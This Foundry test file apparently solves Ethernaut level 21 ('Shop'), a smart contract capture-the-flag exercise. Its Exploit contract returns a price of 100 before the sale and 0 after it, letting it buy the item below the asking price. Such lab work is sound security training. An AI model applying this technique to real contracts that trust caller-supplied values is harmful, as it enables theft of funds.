// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Shop} from "../../src/21/Shop.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ShopFactory} from "src/21/ShopFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract ShopTest is Test, BaseTest {
    Shop public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new ShopFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Shop(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);
        Exploit exploit = new Exploit(instance);

        exploit.buy();

        vm.stopPrank();
    }
}

contract Exploit {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function buy() external {
        shop.buy();
    }
}
